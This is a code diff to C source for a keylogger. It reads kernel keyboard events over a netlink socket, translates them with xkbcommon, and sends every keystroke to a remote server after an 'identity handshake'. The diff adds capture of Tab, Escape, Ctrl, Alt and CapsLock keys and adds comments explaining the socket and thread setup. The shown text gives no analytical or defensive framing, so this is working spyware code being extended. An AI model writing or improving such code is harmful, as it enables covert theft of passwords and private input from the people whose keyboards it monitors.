@@ -155,6 +155,16 @@ void *listen_for_netlink_events(void *arg) {
                     transmit_data_to_server("[L_SHIFT]");
                 } else if (sym == XKB_KEY_Return || sym == XKB_KEY_KP_Enter) {
                     transmit_data_to_server("[ENTER]\n");
+                } else if (sym == XKB_KEY_Tab) {
+                    transmit_data_to_server("[TAB]");
+                } else if (sym == XKB_KEY_Escape) {
+                    transmit_data_to_server("[ESC]");
+                } else if (sym == XKB_KEY_Control_L || sym == XKB_KEY_Control_R) {
+                    transmit_data_to_server("[CTRL]");
+                } else if (sym == XKB_KEY_Alt_L || sym == XKB_KEY_Alt_R) {
+                    transmit_data_to_server("[ALT]");
+                } else if (sym == XKB_KEY_Caps_Lock) {
+                    transmit_data_to_server("[CAPSLOCK]");
                 } else {
                     char char_buf[MAX_KEY_SYMBOL_LENGTH];
                     // Process generic alphanumeric characters as normal UTF-8
@@ -201,7 +211,7 @@ int main(void) {
     printf("[+] Transmitting automated identity handshake...\n");
     transmit_data_to_server(handshake_payload);
 
-    // Attempt keyboard context setup
+    // Initialize the xkbcommon system for keycode translation
     if (initialize_xkb_system() != SUCCESS_CODE) {
         fprintf(stderr, "[!] Initialization aborted: XKB system failed\n");
         if (server_socket_fd != -1) close(server_socket_fd);
@@ -218,9 +228,10 @@ int main(void) {
     }
     
     memset(&addr, 0, sizeof(addr));
-    addr.nl_family = AF_NETLINK; 
-    addr.nl_groups = NETLINK_GROUP_ID;
+    addr.nl_family = AF_NETLINK; // Specify the Netlink family for kernel communication
+    addr.nl_groups = NETLINK_GROUP_ID; // Subscribe to the multicast group for key events
 
+    // Bind the Netlink socket to the specified group for receiving events
     if (bind(netlink_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("[-] Netlink bind failed");
         close(netlink_fd);
@@ -231,6 +242,7 @@ int main(void) {
 
     printf("[+] Architecture ready. Starting event thread...\n");
 
+    // Spawn a dedicated thread to listen for Netlink events and process them
     if (pthread_create(&thread, NULL, listen_for_netlink_events, &netlink_fd) != 0) {
         perror("[-] Failed to create thread");
         close(netlink_fd);
@@ -239,6 +251,7 @@ int main(void) {
         return FAILURE_CODE;
     }
 
+    // Wait for the event listening thread to finish (it runs indefinitely until an error occurs because of the infinite loop)
     pthread_join(thread, NULL);
 
     close(netlink_fd);
